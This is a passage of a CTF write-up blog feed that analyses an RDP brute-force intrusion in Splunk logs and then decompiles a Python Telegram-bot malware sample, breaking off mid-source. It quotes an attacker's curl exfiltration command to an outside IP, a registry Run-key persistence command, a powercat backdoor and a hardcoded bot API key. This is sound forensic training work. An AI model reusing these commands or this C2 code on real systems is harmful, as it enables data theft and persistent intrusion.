@@ -1,0 +1,673 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Splunk on n3rr</title><link>https://n3rr.github.io/tags/splunk/</link><description>Recent content in Splunk on n3rr</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 16 Aug 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://n3rr.github.io/tags/splunk/index.xml" rel="self" type="application/rss+xml"/><item><title>Code Combat X IHack Qualifying Round 2024</title><link>https://n3rr.github.io/p/ihack24/</link><pubDate>Fri, 16 Aug 2024 00:00:00 +0000</pubDate><guid>https://n3rr.github.io/p/ihack24/</guid><description>&lt;img src="https://n3rr.github.io/p/ihack24/ihack-poster.png" alt="Featured image of post Code Combat X IHack Qualifying Round 2024" />&lt;h1 id="dfir-happy-splunking">DFIR (Happy SPLUNKing)
+&lt;/h1>&lt;h2 id="setting-up">Setting Up
+&lt;/h2>&lt;p>Upload the given virtual machine disk file in VMware Workstation Pro.&lt;/p>
+&lt;p>Check if the machine have it&amp;rsquo;s own IP address. If not, change the network adapter from bridge to NAT.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/setup.png"
+width="358"
+height="211"
+srcset="https://n3rr.github.io/p/ihack24/setup_hu_133ea298bc8742ef.png 480w, https://n3rr.github.io/p/ihack24/setup_hu_487dfcd980a38631.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="169"
+data-flex-basis="407px"
+>&lt;/p>
+&lt;p>Then, check if Splunk is running using &lt;code>systemctl status splunk&lt;/code>&lt;/p>
+&lt;p>Access the splunk on browser using &lt;code>http://&amp;lt;machine_ip&amp;gt;:8000&lt;/code>&lt;/p>
+&lt;p>That&amp;rsquo;s all.&lt;/p>
+&lt;h2 id="splunking-1">SPLUNKing 1
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking1.png"
+width="329"
+height="512"
+srcset="https://n3rr.github.io/p/ihack24/splunking1_hu_d06bf05d2d1707c8.png 480w, https://n3rr.github.io/p/ihack24/splunking1_hu_f94228bc6c094588.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="64"
+data-flex-basis="154px"
+>&lt;/p>
+&lt;p>As mentioned in the challenge descriptionn, &lt;strong>TodakX SOC&lt;/strong> have been attacked by someone via RDP brute force. &lt;a class="link" href="https://www.cloudflare.com/learning/access-management/what-is-the-remote-desktop-protocol/#:~:text=The%20Remote%20Desktop%20Protocol%20%28RDP%29%20makes%20it%20possible%20for%20employees,computer%20when%20they%20work%20remotely." target="_blank" rel="noopener"
+>RDP is Remote Desktop Protocol&lt;/a>, as the name says, it allows employees to remotely connect to a physical computer from a distance.&lt;/p>
+&lt;p>Here, the attacker is trying to guess the correct credentials for user admin. From Splunk itself, notice that IP address &lt;strong>192.168.8.52&lt;/strong> has the most event for destination IP, which indicates that IP was being attacked via &lt;a class="link" href="https://www.fortinet.com/resources/cyberglossary/brute-force-attack" target="_blank" rel="noopener"
+>brute force&lt;/a>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/destIP.png"
+width="941"
+height="763"
+srcset="https://n3rr.github.io/p/ihack24/destIP_hu_d1ff6b61d43bdcdc.png 480w, https://n3rr.github.io/p/ihack24/destIP_hu_eb7e4cb58adcc367.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="123"
+data-flex-basis="295px"
+>&lt;/p>
+&lt;p>Filter out the destination IP address.&lt;/p>
+&lt;p>If there is a destination, there must be a source. By examining the source IP, it is evident that &lt;strong>192.168.8.41&lt;/strong> has the most events. This IP address is likely the attacker&amp;rsquo;s. Additionally, the attacker most likely used a script in an attempt to obtain the correct credentials for the victim&amp;rsquo;s IP address.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/sourceIP.png"
+width="945"
+height="559"
+srcset="https://n3rr.github.io/p/ihack24/sourceIP_hu_9ce9a3b4a9b5a6b1.png 480w, https://n3rr.github.io/p/ihack24/sourceIP_hu_329d2ec4d56d7ba0.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="169"
+data-flex-basis="405px"
+>&lt;/p>
+&lt;p>The source IP address can be filtered out by examining the logs in detail, revealing the IP of &lt;strong>DESKTOP-9O75B7U&lt;/strong>, which is an account domain for the user &lt;strong>admin&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info1.png"
+width="665"
+height="666"
+srcset="https://n3rr.github.io/p/ihack24/info1_hu_ecc4370e8bde379f.png 480w, https://n3rr.github.io/p/ihack24/info1_hu_4701c97406cd540e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="99"
+data-flex-basis="239px"
+>&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info2.png"
+width="705"
+height="531"
+srcset="https://n3rr.github.io/p/ihack24/info2_hu_36f0eff50b7bcd3a.png 480w, https://n3rr.github.io/p/ihack24/info2_hu_dcbc34310a92585f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="132"
+data-flex-basis="318px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{admin:192.168.8.52}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-2">SPLUNKing 2
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking2.png"
+width="473"
+height="548"
+srcset="https://n3rr.github.io/p/ihack24/splunking2_hu_effc7f98c24b6cb4.png 480w, https://n3rr.github.io/p/ihack24/splunking2_hu_ce9b866f41549b78.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="86"
+data-flex-basis="207px"
+>&lt;/p>
+&lt;p>As mentioned in the previous challenge, the attacker’s IP address is &lt;strong>192.168.8.41&lt;/strong>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{192.168.8.41}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-3">SPLUNKing 3
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking3.png"
+width="541"
+height="698"
+srcset="https://n3rr.github.io/p/ihack24/splunking3_hu_4560a3c73eb1c7ec.png 480w, https://n3rr.github.io/p/ihack24/splunking3_hu_94d09dd1b7f4853.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="77"
+data-flex-basis="186px"
+>&lt;/p>
+&lt;p>When the attacker runs the brute force script, it attempts each credential from the attacker&amp;rsquo;s wordlist. This results in numerous failed login attempts and one successful attempt. After completing its task, the script displays the correct credential as the result of the brute force attack. Only then can the attacker manually log in using the discovered credentials.&lt;/p>
+&lt;p>Here, the brute force process stopped at &lt;strong>9.55.50 PM&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info3.png"
+width="769"
+height="690"
+srcset="https://n3rr.github.io/p/ihack24/info3_hu_5000c8df83039150.png 480w, https://n3rr.github.io/p/ihack24/info3_hu_fbb6c60350ccfc9d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="111"
+data-flex-basis="267px"
+>&lt;/p>
+&lt;p>Filtering out event &lt;strong>ID 4672&lt;/strong> reveals all successful logins. Identify the timestamp close to when the script finished running, which is two minutes later when the attacker manually logged in as user admin at &lt;strong>7/23/24 9:55:52.000 PM&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info4.png"
+width="975"
+height="603"
+srcset="https://n3rr.github.io/p/ihack24/info4_hu_5f13c24f3b4bdb4.png 480w, https://n3rr.github.io/p/ihack24/info4_hu_2f64832601431c5e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="161"
+data-flex-basis="388px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{07/23/24 09:55:52 PM}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-4">SPLUNKing 4
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking4.png"
+width="566"
+height="662"
+srcset="https://n3rr.github.io/p/ihack24/splunking4_hu_d5ab22fba331952.png 480w, https://n3rr.github.io/p/ihack24/splunking4_hu_3b48263a0038579a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="85"
+data-flex-basis="205px"
+>&lt;/p>
+&lt;p>After the attacker successfully login as user admin the first thing they will face is a CMD (Command Prompt). Filtering out parent command line that have &lt;strong>&amp;ldquo;C:\Windows\system32\cmd.exe&amp;rdquo;&lt;/strong>. Then look for the nearest timestamp after the attacker log in to the machine.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info5.png"
+width="975"
+height="480"
+srcset="https://n3rr.github.io/p/ihack24/info5_hu_1cb6c8c81fe88276.png 480w, https://n3rr.github.io/p/ihack24/info5_hu_87cbe6d520175291.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="203"
+data-flex-basis="487px"
+>&lt;/p>
+&lt;p>Here the first command executed by the attacker after the login is &lt;strong>systemifo&lt;/strong>.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{systeminfo}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-5">SPLUNKing 5
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking5.png"
+width="543"
+height="629"
+srcset="https://n3rr.github.io/p/ihack24/splunking5_hu_48d693e958eb2038.png 480w, https://n3rr.github.io/p/ihack24/splunking5_hu_6fa4e03be814e610.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="86"
+data-flex-basis="207px"
+>&lt;/p>
+&lt;p>To determine which path is being excluded by &lt;strong>Microsoft Defender&lt;/strong>, select the Windows PowerShell log as the source type.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info6.png"
+width="935"
+height="584"
+srcset="https://n3rr.github.io/p/ihack24/info6_hu_beb1f6569c253e05.png 480w, https://n3rr.github.io/p/ihack24/info6_hu_9cff8941f3f8701d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="384px"
+>&lt;/p>
+&lt;p>Anything related to modifying Windows Defender, attacker can use command like &lt;a class="link" href="https://learn.microsoft.com/en-us/powershell/module/defender/?view=windowsserver2022-ps" target="_blank" rel="noopener"
+>Add-MpPreference&lt;/a>&lt;/p>
+&lt;p>Filter out the keyword &lt;strong>Add-MpPreference&lt;/strong>. The displayed command is the command to exclude the path from being detected by Micorsoft Defender.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info7.png"
+width="975"
+height="254"
+srcset="https://n3rr.github.io/p/ihack24/info7_hu_ffc3d44e048eaf9f.png 480w, https://n3rr.github.io/p/ihack24/info7_hu_c9726f30e49f6e6d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="383"
+data-flex-basis="921px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{C:\Windows\microsoft}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-6">SPLUNKing 6
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking6.png"
+width="534"
+height="598"
+srcset="https://n3rr.github.io/p/ihack24/splunking6_hu_81e6bef36901c61b.png 480w, https://n3rr.github.io/p/ihack24/splunking6_hu_652c98ea8713669.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="89"
+data-flex-basis="214px"
+>&lt;/p>
+&lt;p>Again, lookout for any suspicious command excuted from the &lt;strong>powershell.transript log&lt;/strong>.&lt;/p>
+&lt;p>In the same timestamp as the previous challenge, there was a powershell command excuted with a tool called &lt;strong>powercat&lt;/strong> (basically a ncat or nc for windows) and an IP address act as a backdoor.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info8.png"
+width="975"
+height="204"
+srcset="https://n3rr.github.io/p/ihack24/info8_hu_2cf8b8a246eba130.png 480w, https://n3rr.github.io/p/ihack24/info8_hu_aed9e9f55ecffc04.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="477"
+data-flex-basis="1147px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{157.230.33.7}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-7">SPLUNKing 7
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking7.png"
+width="516"
+height="576"
+srcset="https://n3rr.github.io/p/ihack24/splunking7_hu_afa2a0618c79da7f.png 480w, https://n3rr.github.io/p/ihack24/splunking7_hu_c13f7a47c00c1fc2.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="89"
+data-flex-basis="215px"
+>&lt;/p>
+&lt;p>Again, looking at the same log, there was also encoded powershell command executed in order to exfiltrate the data from the host desktop to the attacker’s &lt;strong>C2 server (Command and Control)&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info9.png"
+width="975"
+height="166"
+srcset="https://n3rr.github.io/p/ihack24/info9_hu_3d3bf16138e4ec7b.png 480w, https://n3rr.github.io/p/ihack24/info9_hu_706405ef6a85c06a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="587"
+data-flex-basis="1409px"
+>&lt;/p>
+&lt;p>Decode the encoded strings from &lt;strong>decimal to ascii&lt;/strong>.&lt;/p>
+&lt;p>Decoded strings:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exe&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="n">curl&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">XPOST&lt;/span> &lt;span class="mf">157.230&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">33.7&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">upload&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">F&lt;/span> &lt;span class="n">files&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">:&lt;/span>\&lt;span class="n">Users&lt;/span>\&lt;span class="n">admin&lt;/span>\&lt;span class="n">Downloads&lt;/span>\&lt;span class="n">DESKTOP&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">97&lt;/span>&lt;span class="n">O75B7U&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">zip&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{DESKTOP-97O75B7U.zip}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-8">SPLUNKing 8
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking8.png"
+width="429"
+height="481"
+srcset="https://n3rr.github.io/p/ihack24/splunking8_hu_a09fcb7e3f9a84ad.png 480w, https://n3rr.github.io/p/ihack24/splunking8_hu_7a5c6ff2f7b8294a.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="89"
+data-flex-basis="214px"
+>&lt;/p>
+&lt;p>Also, around the same timestamp, there was another powershell command which acted as a &lt;strong>dropper&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info10.png"
+width="975"
+height="127"
+srcset="https://n3rr.github.io/p/ihack24/info10_hu_468136d0fde0c8be.png 480w, https://n3rr.github.io/p/ihack24/info10_hu_7d2978e85d87369c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="767"
+data-flex-basis="1842px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{nmap.exe}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-9">SPLUNKing 9
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking9.png"
+width="516"
+height="577"
+srcset="https://n3rr.github.io/p/ihack24/splunking9_hu_8bc125599b2252a8.png 480w, https://n3rr.github.io/p/ihack24/splunking9_hu_cbd589a11a5ad9c3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="89"
+data-flex-basis="214px"
+>&lt;/p>
+&lt;p>To find newly created users from Splunk logs, search for the command &lt;code>net user&lt;/code>, as the logs are retrieved from a Windows OS.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info11.png"
+width="975"
+height="222"
+srcset="https://n3rr.github.io/p/ihack24/info11_hu_5e133ee346df9b24.png 480w, https://n3rr.github.io/p/ihack24/info11_hu_ba8b1814fda742f8.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="439"
+data-flex-basis="1054px"
+>&lt;/p>
+&lt;p>Here the newly created user is named &lt;strong>operator&lt;/strong> with the password &lt;strong>operator123&lt;/strong>.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{operator:operator123}&lt;/p>&lt;/blockquote>
+&lt;h2 id="splunking-10">SPLUNKing 10
+&lt;/h2>&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/splunking10.png"
+width="526"
+height="589"
+srcset="https://n3rr.github.io/p/ihack24/splunking10_hu_dbe1562cb782b56e.png 480w, https://n3rr.github.io/p/ihack24/splunking10_hu_60c64775425a6c19.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="89"
+data-flex-basis="214px"
+>&lt;/p>
+&lt;p>This type of TTP used by the attacker was a good move. To search for it, filter out the defined rule name in Splunk. For this case, we choose &lt;a class="link" href="https://attack.mitre.org/techniques/T1012/" target="_blank" rel="noopener"
+>&lt;strong>T1012&lt;/strong>&lt;/a>, which is &lt;strong>Query Registry&lt;/strong> because it looks more interesting than the other.&lt;/p>
+&lt;p>Below is the output that displays after the filtering. Basically, what the attacker trying to do is, everytime the computer starts, it will upload &lt;strong>C:\Users\admin\Documents\DESKTOP-9O75B7U.zip&lt;/strong> to their C2 server.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info12.png"
+width="975"
+height="510"
+srcset="https://n3rr.github.io/p/ihack24/info12_hu_d8ce1b4bfa240f07.png 480w, https://n3rr.github.io/p/ihack24/info12_hu_542fdb2dc827cc7f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="191"
+data-flex-basis="458px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Flag:&lt;/strong> ihack24{reg add &amp;lsquo;HKLM\Software\Microsoft\Windows\CurrentVersion\Run&amp;rsquo; /v report /t REG_SZ /d &amp;lsquo;cmd.exe /c curl -XPOST 157.230.33.7/upload -F files=@C:\Users\admin\Documents\DESKTOP-9O75B7U.zip&amp;rsquo; /f}&lt;/p>&lt;/blockquote>
+&lt;h1 id="malware">Malware
+&lt;/h1>&lt;h2 id="confusing-javascript">Confusing Javascript
+&lt;/h2>&lt;p>Given a javascript file.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">eb925a1589f0c98b5550d3f176a141386bd8285cab874b5ed650535d4a1c0f16.js: JavaScript source, Unicode text, UTF-8 text, with very long lines &lt;span class="o">(&lt;/span>766&lt;span class="o">)&lt;/span>, with CRLF line terminators
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Notice that the filename looks like a hash. Initial step taken was putting the filename into VirusTotal.&lt;/p>
+&lt;p>Link &lt;a class="link" href="https://www.virustotal.com/gui/file/eb925a1589f0c98b5550d3f176a141386bd8285cab874b5ed650535d4a1c0f16/detection" target="_blank" rel="noopener"
+>here&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info13.png"
+width="768"
+height="352"
+srcset="https://n3rr.github.io/p/ihack24/info13_hu_e256348d56c5fab5.png 480w, https://n3rr.github.io/p/ihack24/info13_hu_ac544063dc060a56.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="218"
+data-flex-basis="523px"
+>&lt;/p>
+&lt;p>From here, the solution can go faster for this challenge without opening the javascript file.&lt;/p>
+&lt;p>The link provided by the VirusTotal contains a &lt;a class="link" href="https://github.com/Hrztrm/refactored-bassoon" target="_blank" rel="noopener"
+>github repository with a malicious executable&lt;/a>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info14.png"
+width="768"
+height="392"
+srcset="https://n3rr.github.io/p/ihack24/info14_hu_1a6c6097a1c062a0.png 480w, https://n3rr.github.io/p/ihack24/info14_hu_fd27ba0ff452d9d4.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="195"
+data-flex-basis="470px"
+>&lt;/p>
+&lt;p>Download the &lt;strong>taskmanager.exe&lt;/strong> for further analysis.&lt;/p>
+&lt;p>Upon analysing the file using strings command suggest that the executable file was built using &lt;strong>Python&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info15.png"
+width="768"
+height="173"
+srcset="https://n3rr.github.io/p/ihack24/info15_hu_b8ef6e773bd7e36c.png 480w, https://n3rr.github.io/p/ihack24/info15_hu_a3d272e1aa68ab8c.png 1024w"
+loading="lazy"
+alt="DIE can do it too"
+class="gallery-image"
+data-flex-grow="443"
+data-flex-basis="1065px"
+>&lt;/p>
+&lt;p>Decompile the executable to its source code using &lt;a class="link" href="https://github.com/extremecoders-re/pyinstxtractor" target="_blank" rel="noopener"
+>pyinstxtractor&lt;/a> .&lt;/p>
+&lt;p>&lt;code>python3 pyinstxtractor.py taskmanager.exe&lt;/code>&lt;/p>
+&lt;p>There a lot of files in the executable. The most interesting one is &lt;strong>PythonTelegramBot.pyc&lt;/strong>.&lt;/p>
+&lt;p>&lt;img src="https://n3rr.github.io/p/ihack24/info16.png"
+width="768"
+height="463"
+srcset="https://n3rr.github.io/p/ihack24/info16_hu_c2fc034f7dd6c08b.png 480w, https://n3rr.github.io/p/ihack24/info16_hu_908c9bc12646af9b.png 1024w"
+loading="lazy"
+alt="Result of the tool used"
+class="gallery-image"
+data-flex-grow="165"
+data-flex-basis="398px"
+>&lt;/p>
+&lt;p>Extract the pyc file to source code using &lt;a class="link" href="https://github.com/zrax/pycdc" target="_blank" rel="noopener"
+>pycdc&lt;/a>&lt;/p>
+&lt;p>&lt;code>pycdc PythonTelegramBot.pyc&lt;/code>&lt;/p>
+&lt;p>The source code should be something like below.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;span class="lnt">81
+&lt;/span>&lt;span class="lnt">82
+&lt;/span>&lt;span class="lnt">83
+&lt;/span>&lt;span class="lnt">84
+&lt;/span>&lt;span class="lnt">85
+&lt;/span>&lt;span class="lnt">86
+&lt;/span>&lt;span class="lnt">87
+&lt;/span>&lt;span class="lnt">88
+&lt;/span>&lt;span class="lnt">89
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Source Generated with Decompyle++&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># File: PythonTelegramBot.pyc (Python 3.10)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">telebot&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">platform&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">subprocess&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">BOT_API_KEY&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;6610257712:AAFq_tYFDs5ZpWttF94KchKyzULBVQUW0PY&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">telegram_user_id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x1724E8650&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bot&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">telebot&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">TeleBot&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">BOT_API_KEY&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">verify_telegram_id&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">id&lt;/span>&lt;span class="p">):&lt;/span>
